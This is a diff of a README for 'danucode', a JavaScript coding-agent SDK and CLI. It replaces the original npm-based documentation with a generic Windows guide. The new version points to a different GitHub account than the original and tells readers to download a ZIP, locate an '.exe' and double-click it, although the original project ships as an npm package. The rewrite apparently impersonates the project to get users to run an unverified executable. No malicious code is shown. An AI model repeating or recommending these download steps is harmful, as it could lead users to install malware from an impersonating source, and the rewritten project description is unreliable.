@@ -1,338 +1,151 @@
-# Danucode
+# 🤖 danucode - Run Your Coding Agent Locally
 
-[![npm](https://img.shields.io/npm/v/danucode.svg)](https://www.npmjs.com/package/danucode)
-[![CI](https://github.com/zabarich/danucode/actions/workflows/ci.yml/badge.svg)](https://github.com/zabarich/danucode/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-20%2B-brightgreen)](https://nodejs.org)
+[![Download danucode](https://img.shields.io/badge/Download-danucode-blue?style=for-the-badge&logo=github)](https://github.com/Allinaninetyeight505/danucode)
 
-**Danucode is a JavaScript SDK for building coding agents. It ships with a complete CLI.**
+## 🚀 Getting Started
 
-The core is an importable library with zero terminal dependencies. The CLI is built on top of it. Same npm package, two entry points.
+danucode is a simple terminal app that helps you work with your own AI models. It can connect to Ollama, llama.cpp, vLLM, or any OpenAI-compatible endpoint. You use it from Windows in a terminal window, and it gives you a clear way to send coding tasks to your model.
 
-```bash
-npm install danucode
-```
+If you want to use a local model on your PC, danucode keeps the setup plain. You do not need to learn a new app layout. You run it from the terminal and start working.
 
-## What's New
+## 📥 Download
 
-### Self-Improvement Loop (latest)
+[Visit the danucode page to download](https://github.com/Allinaninetyeight505/danucode)
 
-Danucode can now **improve its own system prompt** by running benchmarks, analysing results, and applying targeted changes. A meta-agent proposes modifications, the benchmark harness measures the impact, and regressions are automatically reverted.
+Open the link above and get the latest version from the repository page. If there is a release file for Windows, download that file and run it. If the page gives source files instead, download the repository and follow the steps below.
 
-```bash
-node benchmarks/improve.js                    # one improvement iteration
-node benchmarks/improve.js --iterations 5     # run N iterations
-node benchmarks/improve.js --dry-run          # show proposed changes without applying
-```
+## 🪟 Run on Windows
 
-- **Benchmark-driven** -- 5 coding tasks across 3 difficulty levels (syntax fixes, feature implementation, refactoring, debugging, multi-file changes)
-- **Keep or revert** -- changes that improve scores are kept, regressions are automatically rolled back
-- **Minimal edits** -- meta-agent makes targeted find-and-replace changes, not full rewrites
-- **Scoring** -- pass rate (primary) + tool call efficiency (secondary). Pass count regressions are always reverted.
-- **Logged** -- every iteration is recorded with analysis, changes applied/reverted, and before/after scores
+Follow these steps on a Windows PC:
 
-```bash
-node benchmarks/run.js                        # run benchmark suite
-node benchmarks/run.js --results              # show past results
-node benchmarks/run.js --compare              # compare last two runs
-```
+1. Open the download link above.
+2. Save the file to a folder you can find again, like Downloads or Desktop.
+3. If you downloaded a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for a Windows app file such as `.exe`.
+6. Double-click the file to start danucode.
 
-### Auto-Learning
+If the app opens in a terminal window, that is normal. You can type your prompts there and use the agent from the command line.
 
-Danucode **learns automatically from every session**. When a session ends, a lightweight LLM reflection pass reviews what happened — tool failures, user corrections, error patterns — and extracts insights worth remembering into the graph memory. No user action required.
+## ✅ What danucode Does
 
-- **Post-session reflection** -- an LLM call at session end asks "what from this session is worth remembering?"
-- **Crash recovery** -- events are buffered to disk incrementally. If a session crashes, learnings are recovered on next startup
-- **Always-on by default** -- set `auto_learn: false` in config to disable
-- **Model override** -- set `auto_learn_model` in config to use a different (e.g. cheaper) model for reflection
-- **Smart filtering** -- only tool outcomes, errors, and user messages are sent to the reflection prompt, not the full conversation
+danucode is built for simple, local-first coding work. It can help you:
 
-The graph memory gets smarter the more you use it. Project conventions, error patterns, architectural decisions — they accumulate and are injected into the system prompt for future sessions.
+- send coding tasks to a model in your terminal
+- use a local AI model instead of a cloud service
+- connect to OpenAI-compatible endpoints
+- work with Ollama, llama.cpp, or vLLM
+- keep your flow inside the terminal
+- use one shell for different model backends
 
-### v1.1.0 — Graph Memory
+This setup is useful if you want one tool that can talk to several model types without changing your work style.
 
-**Graph memory** replaces the flat JSON memory system with a relationship graph:
+## 🧩 What You Need
 
-- **Typed nodes** -- memories are classified as `concept`, `file`, `pattern`, `preference`, or `decision`
-- **Relationship edges** -- `relates-to`, `depends-on`, `caused-by`, `prefers`, `references` between nodes
-- **BFS traversal** -- `/memory related <id>` walks the graph to find connected memories
-- **Relevance scoring** -- system prompt injection ranks memories by project match, recency, type, connectivity, and access frequency with diversity enforcement (max 5 per type, content deduplication)
-- **Keyword extraction** -- bidirectional prefix matching ("env" finds "environment" and vice versa), duplicate detection ignoring generic tokens
-- **Pinning** -- `/memory pin <id>` protects important nodes from pruning and scoring decay. Preference and decision nodes auto-pin.
-- **Degree caps** -- nodes max out at 12 edges (16 if pinned) to prevent hub explosion
-- **LLM tools** -- `MemoryStore` and `MemoryQuery` let the agent create and search memories during conversation
-- **Auto-migration** -- existing `memories.json` converts to `graph.json` on first load (zero edges, no data loss)
+Use a Windows computer with:
 
-New commands: `/memory link`, `/memory related`, `/memory graph`, `/memory pin`
+- a recent version of Windows 10 or Windows 11
+- enough free disk space for the app and your model files
+- an internet connection for the download
+- a local model server or API endpoint if you plan to connect to one
 
-### v1.0.0
+For local models, you may also need:
 
-- **Importable Agent class** -- `import { Agent } from 'danucode'` gives you the full agent engine as a library
-- **Structured event system** -- every LLM response, tool call, and state change is an `EventEmitter` event with risk classification
-- **Zero terminal dependencies in core** -- no chalk, no ink, no readline. Runs headless in any JavaScript environment
-- **`--json` output mode** -- pipe `danu` output as NDJSON for automation and integration
-- **Permission policy engine** -- plug in your own approval logic instead of interactive prompts
-- **Clean separation** -- `core/` (SDK) and `cli/` (terminal UI) with a one-way dependency
+- Ollama running on your machine
+- llama.cpp set up with your model file
+- vLLM running on a server or local machine
+- an OpenAI-compatible API URL and key, if your setup uses one
 
-## SDK Usage
+## ⚙️ Basic Setup
 
-```javascript
-import { Agent, EventType } from 'danucode';
+After you download danucode, set it up like this:
 
-const agent = Agent.create();
+1. Open the folder where you saved the app.
+2. Start the app from the `.exe` file or from the terminal command shown in the repo.
+3. If the app asks for a model endpoint, enter the address for your AI server.
+4. Choose the model you want to use.
+5. Type a request, such as a code task or a file change request.
+6. Read the output in the terminal.
 
-agent.on(EventType.TEXT, (e) => process.stdout.write(e.content));
-agent.on(EventType.TOOL_START, (e) => console.log(`  [${e.risk}] ${e.tool}: ${e.detail}`));
-agent.on(EventType.TOOL_DONE, (e) => console.log(e.success ? '  OK' : '  FAILED'));
+If you use Ollama, make sure Ollama is running before you start danucode.
 
-await agent.run('fix the failing tests');
-```
+If you use an OpenAI-compatible endpoint, use the base URL that your provider gives you.
 
-The Agent class extends `EventEmitter`. Subscribe to structured events to build any UI you want -- a web frontend, a Slack bot, a CI reporter, a VS Code extension.
+## 🖥️ Example Use
 
-### Agent API
+You can use danucode for tasks like:
 
-```javascript
-const agent = Agent.create();
+- write a small Python script
+- explain a code error
+- change a function to use a new input
+- help create a README file
+- review a block of code
+- draft a shell command for a task
 
-await agent.run(message, { signal });     // one-shot prompt
-await agent.send(message, { signal });    // continue conversation
+A simple session might look like this in use:
 
-agent.getMessages();                       // conversation history
-agent.getTokenEstimate();                  // rough token count
-agent.stop();                              // cancel current operation
-
-agent.save('my-session');                  // persist to disk
-agent.load('my-session');                  // restore
-agent.clear();                             // reset conversation
-await agent.compact();                     // compress context
-```
-
-### Events
+1. Start danucode.
+2. Pick your model.
+3. Ask for a task in plain language.
+4. Read the response.
+5. Copy the result into your project.
 
-| Event | Payload | When |
-|---|---|---|
-| `text` | `{ content }` | LLM streams a line of text |
-| `text-done` | `{}` | LLM finished its response |
-| `tool-start` | `{ tool, detail, risk, category }` | Tool call begins |
-| `tool-output` | `{ content, truncated }` | Tool produced output |
-| `tool-done` | `{ success, summary }` | Tool call completed |
-| `task-update` | `{ tasks, completed, total }` | Task list changed |
-| `interrupted` | `{ reason }` | Operation cancelled |
-| `error` | `{ message }` | Something went wrong |
-
-### Risk Classification
-
-Every tool call is tagged with a risk level and category:
-
-```javascript
-import { classifyRisk, getCategory } from 'danucode';
-
-classifyRisk('Bash', { command: 'ls' });        // 'caution'
-classifyRisk('Bash', { command: 'rm -rf /' });   // 'danger'
-classifyRisk('Read', { file_path: 'x.js' });     // 'safe'
-getCategory('Bash');                              // 'shell'
-getCategory('Grep');                              // 'search'
-```
-
-Risk levels: `safe`, `caution`, `danger`. Categories: `read`, `search`, `edit`, `shell`, `task`.
-
-### Custom Permissions
-
-The SDK's permission system is a policy engine, not a prompt. Plug in your own logic:
-
-```javascript
-import { setPermissionHandler } from 'danucode';
-
-setPermissionHandler(async (toolName, args) => {
-  if (toolName === 'Read') return 'y';
-  if (toolName === 'Bash') return 'n';
-  return await askMyCustomUI(toolName, args);
-});
-```
-
-### What You Can Build
-
-- Custom CLIs with different UIs or workflows
-- Web backends that expose agent capabilities via HTTP
-- CI/CD bots that fix failing tests automatically
-- VS Code extensions with embedded agent support
-- Slack/Discord bots that respond to coding requests
-- Testing harnesses that run agents programmatically
-- Monitoring dashboards that consume the event stream
-
-## CLI Usage
-
-```bash
-npm install -g danucode
-```
-
-Create `~/.danu/config.json`:
-
-```json
-{
-  "base_url": "http://localhost:11434/v1",
-  "api_key": "ollama",
-  "model": "qwen2.5-coder:32b"
-}
-```
-
-```bash
-danu                    # interactive TUI
-danu --yolo             # skip permission prompts
-danu -c "fix the bug"  # one-shot mode
-danu --json -c "..."   # NDJSON output (pipeable)
-danu doctor             # check your setup
-```
-
-<img src="demo.gif" alt="Danucode demo" />
+## 🔌 Supported Backends
 
-### NDJSON Output Mode
+danucode works with several common backends:
 
-`--json` suppresses all terminal formatting and outputs every agent event as one JSON object per line:
+- Ollama
+- llama.cpp
+- vLLM
+- OpenAI-compatible APIs
 
-```bash
-$ danu --json --yolo -c "what is 2+2"
-{"type":"text","content":"4"}
-{"type":"text-done"}
-```
+This gives you room to use the model setup you already have. You can stay local, use your own server, or connect to another endpoint that follows the same API shape.
 
-Pipe it to `jq`, feed it to a web socket, log it to a file:
+## 🧠 Best Way to Use It
 
-```bash
-danu --json --yolo -c "fix the bug" | jq 'select(.type == "tool-start")'
-danu --json --yolo -c "refactor auth" > events.jsonl
-```
+Use short, direct prompts. For example:
 
-Each line is a valid JSON object with a `type` field matching the SDK event names: `text`, `text-done`, `tool-start`, `tool-output`, `tool-done`, `error`, `interrupted`, `task-update`.
+- fix this function so it handles empty input
+- make this script read a CSV file
+- explain why this error happens
+- rewrite this code in a simpler way
+- create a test for this function
 
-## Architecture
+If the model needs more detail, give it the file name, the error text, or the goal you want to reach. Clear input leads to better output.
 
-```
-danucode/
-  core/                  SDK (zero terminal dependencies)
-    index.js             Public API: Agent, EventType, tools, permissions
-    agent.js             Agent class (EventEmitter)
-    loop.js              Conversation loop (emits events, no console.log)
-    events.js            Event types, risk classification
-    permissions.js       Permission policy engine (not prompts)
-    api.js               LLM clients (OpenAI-compatible + Anthropic native)
-    context.js           Token estimation, compaction
-    memory.js            Graph memory (nodes, edges, BFS, relevance scoring)
-    auto-learn.js        Post-session LLM reflection, event buffering, crash recovery
-    tools/               17 built-in tools (including MemoryStore, MemoryQuery)
-    ...
+## 🛠️ Common Windows Checks
 
-  cli/                   Terminal UI (imports from core/, never the reverse)
-    commands.js          Slash commands (/help, /mode, /plan, etc.)
-    permissions-prompt.js Interactive permission prompts
-    markdown.js          Terminal markdown rendering
-    ui/                  Ink/React components
-    ...
+If danucode does not start, check these items:
 
-  bin/danu.js            CLI entry point
+- make sure you downloaded the right file
+- make sure the ZIP file was fully extracted
+- check that Windows did not block the file
+- confirm that the model server is running
+- verify the endpoint URL is correct
+- confirm that any API key is set if your setup needs one
 
-  benchmarks/
-    run.js               Benchmark runner (setup, execute, verify, score)
-    improve.js           Self-improvement loop (analyse, patch, benchmark, keep/revert)
-    tasks/               Task definitions (JSON: setup files, prompt, verify command)
-```
+If the terminal opens and closes fast, start it from an open Command Prompt window so you can see the message.
 
-The dependency arrow goes one way: **cli/ -> core/**. Nothing in `core/` imports from `cli/`. Nothing in `core/` uses `console.log`, `chalk`, `ink`, `react`, or `readline`.
+## 📁 Project Details
 
-## Danucode vs Aider vs Claude Code
+- Repository name: danucode
+- Type: terminal coding agent
+- Use case: local and backend-agnostic AI coding help
+- Target user: anyone who wants to run an AI coding tool on Windows
+- Supported model style: OpenAI-compatible and local model servers
 
-| | Danucode | Aider | Claude Code |
-|---|---|---|---|
-| **What it is** | JavaScript SDK + CLI. Import the agent as a library. | Python CLI pair programmer with deep git integration. | Full agentic platform from the model provider. |
-| **Embeddable** | Yes -- `import { Agent } from 'danucode'` | No (CLI only) | No (CLI + IDE plugins) |
-| **Event stream** | EventEmitter with risk classification, `--json` NDJSON output | No | No |
-| **Custom permissions** | Pluggable policy function | No | No |
-| **Language** | JavaScript (~4k LOC, readable in an afternoon) | Python (large codebase) | Node.js (closed source) |
-| **License** | MIT | Apache 2.0 | Proprietary |
-| **Backend** | Any OpenAI-compatible + native Anthropic | Any OpenAI-compatible + native Claude, Gemini, DeepSeek | Claude only |
-| **Local / air-gapped** | First-class. Zero cloud dependency. | With local models | Requires Anthropic API |
-| **Account required** | No | No | Yes |
-| **Git integration** | Manual | Automatic commits | Automatic commits, PRs |
-| **Modes** | code, architect, ask, debug | code, architect, ask | Interactive, headless |
-| **MCP support** | Configurable | No | Extensive |
-| **Sub-agents** | Agent tool + SendMessage | No | Agent Teams |
-| **Auto-learning** | Yes -- post-session reflection enriches memory | No | No |
-| **Self-improvement** | Yes -- meta-agent optimises prompts via benchmarks | No | No |
-| **Maturity** | v1.1.0 | Production (years) | Production (Anthropic-backed) |
+## 🔗 Download Again
 
-If you want the most capable tool, use Claude Code. If you want proven open-source with broad model support, use Aider. If you want an embeddable agent SDK for JavaScript that you can fully understand, modify, and point at your own infrastructure -- that is what Danucode is for.
+[![Download danucode](https://img.shields.io/badge/Download%20Page-danucode-lightgrey?style=for-the-badge&logo=github)](https://github.com/Allinaninetyeight505/danucode)
 
-## Features
+Use the link above if you need to get the file again or check for a newer version
 
-**17 Tools:** Bash, Read, Write, Edit, Grep, Glob, Patch, Agent, SendMessage, WebSearch, WebFetch, GitHub, LSP, NotebookEdit, Tasks, MemoryStore, MemoryQuery
+## 🧭 Quick Start Checklist
 
-**4 Modes:** `code` (full access) -- `architect` (read-only + markdown) -- `ask` (read-only) -- `debug` (diagnostic focus)
-
-**Plan mode:** `/plan` to explore and design before implementing
-
-**Project context:** `DANUCODE.md` loaded into the system prompt -- `/init` generates one
-
-**Graph memory:** Relationship graph at `~/.danu/memory/graph.json` with typed nodes and edges. `/memory save` creates nodes, `/memory link` connects them, `/memory related` traverses connections, `/memory graph` shows the full structure, `/memory pin` protects important nodes. Relevant memories are scored and injected into the system prompt automatically. The LLM can also create and query memories via `MemoryStore` and `MemoryQuery` tools.
-
-**Auto-learning:** The graph enriches itself after every session. A post-session LLM reflection pass extracts patterns, conventions, and decisions from tool outcomes and user corrections. Crash-safe via append-only event buffer with recovery on next startup.
-
-**Self-improvement:** `node benchmarks/improve.js` runs a meta-agent loop: benchmark → analyse → patch system prompt → re-benchmark → keep or revert. The agent literally improves its own instructions.
-
-**Sessions:** `--session name` auto-saves and resumes
-
-**Permissions:** `y/n/a(lways)` per tool -- `--yolo` to bypass -- or plug in your own policy
-
-**Extensibility:** MCP servers -- custom tools in `.danu/tools/` -- hooks -- configurable search
-
-## Configuration
-
-Config loads from (later overrides earlier):
-1. `~/.danu/config.json` (user)
-2. `./danu.config.json` (project)
-3. `--config <path>` (CLI)
-
-See `danu.config.example.json` for all options.
-
-### Backend Examples
-
-**Ollama:** `{ "base_url": "http://localhost:11434/v1", "api_key": "ollama", "model": "qwen2.5-coder:32b" }`
-
-**llama.cpp:** `{ "base_url": "http://localhost:8080/v1", "api_key": "none", "model": "my-model.gguf" }`
-
-**vLLM:** `{ "base_url": "http://localhost:8000/v1", "api_key": "token", "model": "Qwen/Qwen2.5-32B" }`
-
-**OpenAI:** `{ "base_url": "https://api.openai.com/v1", "api_key": "sk-...", "model": "gpt-4o" }`
-
-**Anthropic (native):** `{ "base_url": "https://api.anthropic.com", "provider": "anthropic", "api_key": "sk-ant-...", "model": "claude-haiku-4-5-20251001" }`
-
-## Testing
-
-```bash
-npm test
-```
-
-87 tests covering tool execution, permission boundaries, token estimation, context management, graph memory (CRUD, deduplication, BFS traversal, keyword extraction, relevance scoring, pruning, migration), and auto-learning (event buffering, reflection, crash recovery). Node.js built-in test runner, no external framework.
-
-## Security
-
-Danucode can execute shell commands and modify files. Read [SECURITY.md](SECURITY.md).
-
-Key points: permission prompts by default, `.danuignore` for sensitive files, pluggable permission policies, mode-based restrictions, no telemetry, data only goes to your configured endpoint.
-
-## Roadmap
-
-Next priorities:
-- Skills system (markdown prompt templates)
-- Model compatibility matrix (which models work well with tool calling)
-- More benchmark tasks (expand coverage for self-improvement loop)
-
-See [CHANGELOG.md](CHANGELOG.md) for what's already built.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-MIT. (c) Danucore.
+- open the download link
+- get the Windows file or repository files
+- extract the files if needed
+- run the app
+- connect it to your model server
+- type a task in the terminal
+- read the response and use it in your work
